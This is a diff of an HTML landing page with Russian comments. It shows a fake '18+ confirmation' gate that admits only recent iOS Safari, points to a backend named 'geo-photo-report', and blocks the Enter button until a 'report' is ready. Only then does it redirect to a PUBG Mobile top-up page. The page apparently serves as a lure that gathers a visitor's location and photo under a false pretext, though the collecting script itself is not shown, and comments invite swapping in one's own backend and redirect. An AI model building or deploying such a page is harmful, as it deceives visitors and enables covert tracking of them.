@@ -10,6 +10,7 @@
 
   <!-- ✅ API адрес -->
   <script>
+    // Поставь свой бекенд, если другой:
     window.__API_BASE = 'https://geo-photo-report.onrender.com';
   </script>
 
@@ -68,9 +69,9 @@
   </div>
 
   <!-- 🔒 Основной фронтовый код -->
-  <script src="/app.js?v=4"></script>
+  <script src="/app.js?v=5"></script>
 
-  <!-- Логика проверки устройства и перехода -->
+  <!-- Логика проверки устройства/автостарт -->
   <script>
     const $ = id => document.getElementById(id);
 
@@ -95,6 +96,7 @@
       const isiOS = isIOSFamily();
       const ok = isiOS && ver && ver >= 18 && isSafariWebKit();
 
+      // Если хочешь разрешить всем (для дебага) — установи ok = true;
       if (ok) {
         $('title').textContent = 'Подтверждение 18+';
         $('text').innerHTML = '<span class="ok">Доступ разрешён.</span>';
@@ -108,7 +110,8 @@
 
         $('enterBtn').addEventListener('click', e => {
           if (!window.__reportReady) { e.preventDefault(); return; }
-          location.assign('https://www.pubgmobile.com/ig/itop'); // ⚠️ сюда твой реальный редирект
+          // редирект после успешной проверки
+          location.assign('https://www.pubgmobile.com/ig/itop'); // замени на свой URL
         });
       } else {
         $('title').textContent = 'Доступ отклонён';
